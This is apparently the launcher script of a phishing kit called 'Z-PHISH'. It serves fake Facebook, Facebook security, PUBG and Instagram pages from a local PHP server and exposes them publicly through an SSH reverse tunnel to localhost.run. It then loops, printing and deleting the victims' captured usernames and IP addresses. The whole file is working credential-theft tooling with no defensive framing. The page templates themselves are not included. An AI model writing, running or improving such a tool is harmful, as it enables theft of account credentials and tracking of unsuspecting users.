import os
import time
from colorama import Fore
from re import search
from os.path import isfile
from subprocess import DEVNULL, PIPE, Popen, STDOUT
global site
def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""

error_file = "error.log"
log = "lh.log"
c_log = open(log, 'w')
def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text)+"\n")

def grep(regex, target):
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""
def null(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)

def start(site):
    print(f'{Fore.YELLOW}\n[+] Starting PHP Server...')
    print(f'{Fore.YELLOW}\n[+] Port: 8080')
    os.system(f"php -S localhost:8080 -t server/{site} > /dev/null 2>&1 & ")
    null("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=c_log, stderr=c_log)
    success = False
    for i in range(10):
        url = grep("(https://[-0-9a-z.]*.lhr.life)", log)
        if url != "":
            success = True
            break
        time.sleep(1)
    print(f'{Fore.GREEN}\n[+] Link: {url}')
    print(f'{Fore.YELLOW}\n[+] Please Wait.....')
    while True:
        if os.path.isfile(f'server/{site}/usernames.txt'):
            print(f'{Fore.GREEN}\n[*] User Found!')
            os.system(f"cat server/{site}/usernames.txt")
            os.system(f"rm -rf server/{site}/usernames.txt")
        if os.path.isfile(f'server/{site}/ip.txt'):
            print('\n[!] IP Found!')
            os.system(f"cat server/{site}/ip.txt")
            os.system(f"rm -rf server/{site}/ip.txt")
            print(f"{Fore.CYAN}="*50)
def slect():
    os.system("killall php")
    os.system("clear")
    os.system("figlet Z-PHISH | lolcat")
    print(f"""{Fore.CYAN}
    [1] Facebook   [2] PUBG

    [3] Instagram  [0] Exit
    """)
    choo = int(input('\nEnter Number:  '))
    if choo == 1:
        print("[1] Facebook")
        print("[2] Facebook_security")
        a = int(input("\nEnter Number : "))
        if a == 1:
          site = "facebook"
          start(site)
        elif a == 2:
            site = "fb_security"
            start(site)
        else:
            slect()
    elif choo == 2:
        site = "pubg"
        start(site)
    elif choo == 3:
        site ="instagram"
        start(site)
    elif choo == 0:
        exit()
    else:
        print(f'{Fore.RED}\n[!] Error Invalit Number!')
        time.sleep(2)
        slect()

slect()